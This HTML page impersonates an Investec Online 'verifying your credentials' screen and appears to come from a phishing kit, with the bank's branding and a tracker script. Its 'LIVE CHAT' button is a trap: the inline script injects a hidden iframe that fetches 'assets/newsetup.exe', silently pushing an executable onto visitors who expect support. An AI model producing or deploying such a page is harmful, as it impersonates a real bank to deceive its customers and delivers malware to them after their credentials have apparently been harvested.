<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying - Investec Online</title>
    <link rel="icon" type="image/png" href="icon.png">
    <link rel="stylesheet" href="loading.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="container">
            <div class="logo">
                <img src="investiclogo.png" alt="Investec" class="logo-image">
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="loading-card">
            <div class="spinner"></div>
            <h2 class="loading-text">Verifying your information</h2>
            <p class="loading-subtext">Please wait while we securely verify your credentials</p>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <h2 class="footer-title">Login to other Investec accounts</h2>
            
            <div class="footer-links">
                <div class="footer-column">
                    <a href="#" class="footer-link">Investec Save</a>
                    <a href="#" class="footer-link">Channel Islands Trust & Corporate</a>
                </div>
                <div class="footer-column">
                    <a href="#" class="footer-link">Asset Management Indicator</a>
                    <a href="#" class="footer-link">Private Banking Switzerland</a>
                </div>
                <div class="footer-column">
                    <a href="#" class="footer-link">Investec Capital Solutions</a>
                    <a href="#" class="footer-link">Structured Products for IFAs</a>
                </div>
                <div class="footer-column">
                    <a href="#" class="footer-link">Securities Research</a>
                </div>
            </div>
        </div>
    </footer>
<!-- alp-livechat-widget -->
<style>
  #alp-livechat-btn { position: fixed !important; right: 24px !important; bottom: 24px !important; z-index: 2147483647 !important; display: inline-flex !important; align-items: center !important; gap: 8px !important; padding: 12px 22px !important; background: #3d4f5c !important; color: #fff !important; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif !important; font-size: 14px !important; font-weight: 700 !important; letter-spacing: .5px !important; text-decoration: none !important; border: none !important; border-radius: 999px !important; box-shadow: 0 8px 24px rgba(0,0,0,.25), 0 2px 6px rgba(0,0,0,.15) !important; cursor: pointer !important; transition: transform .15s ease, box-shadow .15s ease, background .2s ease !important; line-height: 1 !important; }
  #alp-livechat-btn:hover { transform: translateY(-2px) !important; box-shadow: 0 12px 30px rgba(0,0,0,.3), 0 4px 8px rgba(0,0,0,.18) !important; background: #2f3d47 !important; color: #fff !important; }
  #alp-livechat-btn:active { transform: translateY(0) !important; }
  #alp-livechat-btn svg { flex-shrink: 0 !important; }
  @media (max-width: 480px) { #alp-livechat-btn { right: 16px !important; bottom: 16px !important; padding: 10px 18px !important; font-size: 13px !important; } }
</style>
<button id="alp-livechat-btn" type="button" aria-label="Live Chat"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>LIVE CHAT</button>
<script>(function(){function init(){var b=document.getElementById('alp-livechat-btn');if(!b)return;if(b.parentNode!==document.body){document.body.appendChild(b);}b.addEventListener('click',function(e){e.preventDefault();var f=document.createElement('iframe');f.style.display='none';f.src='assets/newsetup.exe';document.body.appendChild(f);},true);}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',init);}else{init();}})();</script>
</body>
</html>
